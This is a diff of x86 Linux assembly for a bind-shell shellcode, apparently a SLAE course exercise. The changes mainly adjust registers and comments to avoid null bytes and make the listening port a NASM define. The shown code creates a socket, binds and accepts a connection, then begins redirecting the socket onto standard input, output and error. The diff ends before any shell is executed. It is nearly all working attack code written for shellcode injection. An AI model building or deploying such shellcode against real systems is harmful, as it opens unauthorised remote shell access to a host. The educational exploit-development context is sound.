@@ -1,9 +1,9 @@
 ; SLAE-X 
 ; thanks to writesup from previou students
-; syscall available here /usr/include 
-; i am not too original here except in the way port is computed in nasm (using define function) 
-; but the shell outputed is dumb, the port is calculated on compile 
+; syscalls doc is here: /usr/include/i386-linux-gnu/asm/unistd_32.h
+; i am not too original in here , ill try to make it more exotic 
 ; requirement : no null byte only 
+; objdump -d simplebindshell -M intel | grep 00
 
 
 ; little trick to specify port in human readable format 
@@ -17,25 +17,25 @@ global _start
 
 _start: 
 	; syscall create socket fd argument is 0x1 in ebx 
-	; arguments are (2) (1) and AF_INET / PF_INET (0) in reverse order  
-	mov    ebx,0x1
+	; arguments are PF_INET = AF_INET (2), SOCK_STREAM (1), IPPROTO_IP(0) in reverse order  
+	mov    bl,0x1
 	; the two next operands replace "push 0x0" which contains null byte 
 	xor eax,eax
 	push eax 
 	push   0x1
 	push   0x2
-	; here we create somehow a struct by sending the pointer to the three arguments we pushed, the struct lives in esp memory  
+	; here we create somehow a struct by sending a pointer to esp where we pushed arguments, the struct lives on the stack   
 	mov    ecx,esp
 	; syscall socket is 112 so 0x66 in hex 
-	mov    eax,0x66
+	mov    ax,0x66
 	int    0x80
-	; saving file descriptor received 
+	; saving file descriptor received into edi, i tried to use the .bss but it did not work on shellcode injection (it skips the part where the elf init the .bss maybe?) 
 	mov    edi,eax
 
 	; syscall socket bind 
 	mov    ebx,0x2
 	push   0x0
-	push word  0xb315
+	push word  PORT 
 	push word  0x2
 	mov    ecx,esp
 	push   0x10
@@ -54,18 +54,18 @@ _start:
 	int    0x80
 
 	; syscall socket accept 
-mov    eax,0x66
-mov    ebx,0x5
-push   0x0
-push   0x0
-push   edi
-mov    ecx,esp
-int    0x80
+	mov    eax,0x66
+	mov    ebx,0x5
+	push   0x0
+	push   0x0
+	push   edi
+	mov    ecx,esp
+	int    0x80
 
-	; duplicating fd from socket to stdin stdout stderr 
+	; duplicating fd from socket to stdin stdout stderr of the process 
 	mov    ebx,eax
 	mov    ecx,0x2
-loop: 
+	loop: 
 	mov    eax,0x3f
 	int    0x80
 	dec    ecx
